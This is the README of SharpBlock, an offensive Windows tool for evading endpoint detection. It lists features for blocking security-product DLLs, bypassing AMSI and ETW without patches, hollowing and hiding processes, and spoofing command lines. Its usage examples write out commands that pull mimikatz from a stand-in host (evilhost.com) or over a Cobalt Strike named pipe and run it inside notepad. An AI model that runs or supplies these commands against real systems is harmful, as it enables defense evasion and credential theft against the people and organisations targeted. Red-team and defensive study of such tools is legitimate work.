# SharpBlock
A method of bypassing EDR's active projection DLL's by preventing entry point execution.  

## Features

* Blocks EDR DLL entry point execution, which prevents EDR hooks from being placed.
* Patchless AMSI bypass that is undetectable from scanners looking for Amsi.dll code patches at runtime.
* Host process that is replaced with an implant PE that can be loaded from disk, HTTP or named pipe (Cobalt Strike)
* Implanted process is hidden to help evade scanners looking for hollowed processes.
* Command line args are spoofed and implanted after process creation using stealthy EDR detection method.
* Patchless ETW bypass.
* Blocks NtProtectVirtualMemory invocation when callee is within the range of a blocked DLL's address space

## Examples

### Launch mimikatz over HTTP using notepad as the host process, blocking SylantStrike's DLL

```
SharpBlock -e http://evilhost.com/mimikatz.bin -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee
```

### Launch mimikatz using Cobalt Strike beacon over named pipe using notepad as the host process, blocking SylantStrike's DLL

```
execute-assembly SharpBlock.exe -e \\.\pipe\mimi -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee
upload_file /home/haxor/mimikatz.exe \\.\pipe\mimi
```
*Note, for the `upload_file` beacon command, load upload.cna into Cobalt Strike's Script Manager*
